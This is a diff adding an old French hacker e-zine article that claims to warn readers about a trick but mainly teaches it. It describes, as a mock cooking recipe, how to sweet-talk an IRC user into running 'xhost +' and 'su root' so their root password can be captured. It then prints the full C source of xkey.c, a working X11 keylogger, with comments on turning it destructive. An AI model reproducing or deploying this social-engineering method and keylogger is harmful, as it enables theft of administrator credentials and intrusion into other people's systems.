@@ -1,0 +1,211 @@
+                     Comment se proteger de l'esprit malin!
+                     ======================================
+                                      By Lionel
+                                      =========
+
+
+
+
+1)Intro
+-------
+
+Je cherchais un idée d'article pour un pote "datahck"(qui est now dans la crew
+:) sur la base du "hacking". Je me demandais comment une personne pourrait
+t'elle faire pour demander gentiment à un personne par exemple de "irc" de lui
+passer ces passwds de son conte root sans avoir besion d'etre "mechant".Et
+tout à coups j'ai un declique :)
+Biensur tout ce texte n'est pas a un but de piratage mais juste de prevenir
+pour que cela n'arrive pas...
+
+2)Expliquation
+---------------
+
+En faite le but est qu'il nous donne son passwd root de sont plein grée ou
+presque ;) , c'est un peu du "S.E." mais c'est tres con aussi je suis surement
+pas le premier a avoir eu l'idée!
+Bon j'arrette le blabla et je balance:
+Ingrediens:
+-un boufon
+-xkey.c ou autre 
+-etre gentil (bien elevé)
+-telnet ou rlogin ...(voir autre)
+Si vous manque quelque chose, allé vite l'acheter ;)
+"-Alors mayté comment melange ton les ingrediens?
+Ou la! la! tres tres simple aujourd'hui notre petite recette , peu chere!
+Alors on prend le boufon en private on le sucre un peu , on le leche bien, 
+on laisse bien mijoter!
+Quand il est cuit a point, on lui demande de faire un chtit "xhost +" pour
+qu'il sois bien ferme , et la on prend notre cuilleir a soupe ( xkey.c ou
+autre) et on remu bien ! Quand ca commence a etre bien chaud on demande a
+notre boufon de bien vouloir faire "su root" pour lancer un ingredient root au
+choix pour faire bien resortir le parfaim du boufon puis apres cela il suffit
+de verser le tout dans une assiette a soupe (telnet) et apres y reste plus
+qu'a manger!!!!
+Degusté mes chers apprentis cuisiniés!!!!! Alors c'est pas delicieux?
+C'etais mayté pour OrganiKs Crew a la prochaine! "
+-merci mayté pour ta superbe recette!
+
+Comment ce proteger de cette technique vraiment horible en faite c'est simple
+suffit de pas etre con :) !!! On vous aurra prevenu!
+
+
+3)xkey.c
+--------
+
+On vous mets le pain dans la bouche:
+
+/* To compile, run it through your favorite ansi compiler something like
+ * this :
+ *
+ *    gcc -o xkey xkey.c -lX11 -lm
+ *
+ * To run it, just use it like this :  xkey displayname:0
+ * and watch as that display's keypresses show up in your shell window.
+ *
+ *    Dominic Giampaolo (nick@cs.maxine.wpi.edu)
+ */
+#include <stdio.h>
+#include <X11/X.h>
+#include <X11/Xlib.h>
+#include <X11/Intrinsic.h>
+#include <X11/StringDefs.h>
+#include <X11/Xutil.h>
+#include <X11/Shell.h>
+
+char *TranslateKeyCode(XEvent *ev);
+
+
+Display *d;
+
+void snoop_all_windows(Window root, unsigned long type)
+{
+  static int level = 0;
+  Window parent, *children, *child2;
+  unsigned int nchildren;
+  int stat, i,j,k;
+
+  level++;
+
+  stat = XQueryTree(d, root, &root, &parent, &children, &nchildren);
+  if (stat == FALSE)
+   {
+     fprintf(stderr, "Can't query window tree...\n");
+     return;
+   }
+
+  if (nchildren == 0)
+    return;
+
+  /* For a more drastic inidication of the problem being exploited
+   * here, you can change these calls to XSelectInput() to something
+   * like XClearWindow(d, children[i]) or if you want to be real
+   * nasty, do XKillWindow(d, children[i]).  Of course if you do that,
+   * then you'll want to remove the loop in main().
+   *
+   * The whole point of this exercise being that I shouldn't be
+   * allowed to manipulate resources which do not belong to me.
+   */
+  XSelectInput(d, root, type);
+
+  for(i=0; i < nchildren; i++)
+   {
+     XSelectInput(d, children[i], type);
+     snoop_all_windows(children[i], type);
+   }
+
+  XFree((char *)children);
+}
+
+
+void main(int argc, char **argv)
+{
+  char *hostname;
+  char *string;
+  XEvent xev;
+  int count = 0;
+
+  if (argv[1] == NULL)
+    hostname = ":0";
+  else
+    hostname = argv[1];
+
+  d = XOpenDisplay(hostname);
+  if (d == NULL)
+   {
+     fprintf(stderr, "Blah, can't open display: %s\n", hostname);
+     exit(10);
+   }
+
+  snoop_all_windows(DefaultRootWindow(d), KeyPressMask);
+
+  while(1)
+   {
+     XNextEvent(d, &xev);
+
+     string = TranslateKeyCode(&xev);
+     if (string == NULL)
+       continue;
+
+     if (*string == '\r')
+       printf("\n");
+     else if (strlen(string) == 1)
+       printf("%s", string);
+     else
+       printf("<<%s>>", string);
+     fflush(stdout);
+   }
+}
+
+
+#define KEY_BUFF_SIZE 256
+static char key_buff[KEY_BUFF_SIZE];
+
+char *TranslateKeyCode(XEvent *ev)
+{
+  int count;
+  char *tmp;
+  KeySym ks;
+
+  if (ev)
+   {
+     count = XLookupString((XKeyEvent *)ev, key_buff, KEY_BUFF_SIZE, &ks,NULL);
+     key_buff[count] = '\0';
+
+     if (count == 0)
+      {
+        tmp = XKeysymToString(ks);
+        if (tmp)
+          strcpy(key_buff, tmp);
+        else
+          strcpy(key_buff, "");
+      }
+
+     return key_buff;
+   }
+  else
+    return NULL;
+}
+
+
+4)Conclusion
+------------
+
+J'espere que vous avez bien compris que ceci ne doit pas marcher des mass et
+que c'est totalement illegale de faire ca , c'est bien pour ca que ce texte
+est la pour vous prevenir!!! Total secu quand meme ;)
+Petite chose pour ce qui ne sont pas au courant que dans les nouvelles
+distribe de linux il est impossible de se connecter en root sur le telnet
+(voir +) ...
+Voir aussi ./progs/xx.c -> Block linux à distance grace à un flood sur xwin...
+
+5)Greetz
+--------
+
+To: clemm, spoty , ank , tiffa, shado, klog, XSFX, Datahck, OrganiKs,[fred],
+Mayhem, rix, exile , chx , prfalken , togusa , einstein , #toulouse, #r9,
+#rhino9,madchat(#madchat->undernet),Darkbug,#linux-fr(ircnet),#oracle(efnet),
+torcy&marcx dormoy&18eme (Ali k.,Xav,Olivier,Mathieux,Mémet,Arnauld,Camel,...),
+cantepeau(sophie,ced,youness,seb,la shente,bouboule,ouadgerie, ...),
+ toulouse(Gui.,florian,Lionel,JM,Dav,Vincent,Bruno,yohan,seb,cyril,
+damien,jenny&virginie,stef&julie...).......Et tous ce que j'oublie...
+
